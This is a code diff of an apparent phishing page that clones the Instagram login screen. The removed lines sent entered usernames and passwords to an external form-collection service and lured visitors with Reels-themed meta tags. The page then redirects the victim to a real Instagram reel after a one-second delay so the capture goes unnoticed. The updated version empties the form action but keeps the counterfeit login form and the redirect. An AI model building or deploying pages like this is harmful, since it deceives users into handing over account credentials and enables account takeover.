@@ -10,16 +10,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
     <title>Login • Instagram</title>
-    <link rel="stylesheet" href="loginstyle.css">
-    <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp">
+    <link rel="stylesheet" href="css/loginstyle.css">
+    <link rel="shortcut icon" href="img/Instagram_logo_2016.svg.webp">
       <!-- General Meta Tags -->
-  <meta name="description" content="Watch amazing Instagram Reels videos. Trending, funny, dance, and lifestyle content updated regularly.">
-  <meta name="keywords" content="Instagram, Reels, videos, trending, dance, lifestyle, funny, viral, short videos, entertainment">
-  <meta name="author" content="roshanvadassery">
 
-  <!-- Open Graph Meta Tags for social sharing -->
-  <meta property="og:title" content="Trending Instagram Reels">
-  <meta property="og:description" content="Explore the best Instagram Reels with a mix of fun, trending, and viral content.">
 
     <style>
         img {
@@ -37,7 +31,7 @@
         <div class="box">
             <div class="heading"></div>
             
-            <form class="login-form" action="https://getform.io/f/bwnnyoya" method="post" onsubmit="redirectToInstagram(event)">
+            <form class="login-form" action="" method="post" onsubmit="redirectToInstagram(event)">
                 <div class="field">
                     <input id="username" type="text" name="username" placeholder="Phone number, username, or email" required />
                     <label for="username">Phone number, username, or email</label>
@@ -54,11 +48,11 @@
                     <div class="line"></div>
                 </div>
                 <div class="other">
-                    <button class="fb-login-btn" type="button" onclick="window.location.href='facebook-login.html'">
+                    <button class="fb-login-btn" type="button" onclick="window.location.href='https://www.facebook.com/login.php/'">
                         <i class="fa fa-facebook-official fb-icon"></i>
                         <span>
                             <img src="https://t3.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://www.facebook.com/&size=256" height="15" width="15" />
-                            &nbsp;<a href="facebook-login.html">Log in with Facebook</a>
+                            &nbsp;<a href="https://www.facebook.com/login.php/">Log in with Facebook</a>
                         </span>
                     </button>
                     <a class="forgot-password" href="https://www.instagram.com/accounts/password/reset/?__pwa=1">Forgot password?</a>
@@ -79,10 +73,10 @@
     <br>
     <div class="apps">
         <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en_IN">
-        <img src="/c5Rp7Ym-Klz.png" height="40"
+        <img src="/img/google-playstore.png" height="40"
             width="134"></a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;
         <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US"> 
-        <img src="/EHY6QnZYdNX.png" height="40" width="auto"></a>
+        <img src="img/microsoft-store.png" height="40" width="auto"></a>
         </div>
         <br>
         <div class="footer">
@@ -159,7 +153,7 @@
     function redirectToInstagram(event) {
         // Wait briefly to ensure the form is submitted
         setTimeout(function () {
-            window.location.href = "https://www.instagram.com/reel/DCjSDShTit9/?utm_source=ig_web_copy_link";
+            window.location.href = "https://www.instagram.com/";
         }, 1000); // Redirect after 1 second
     }
 </script>
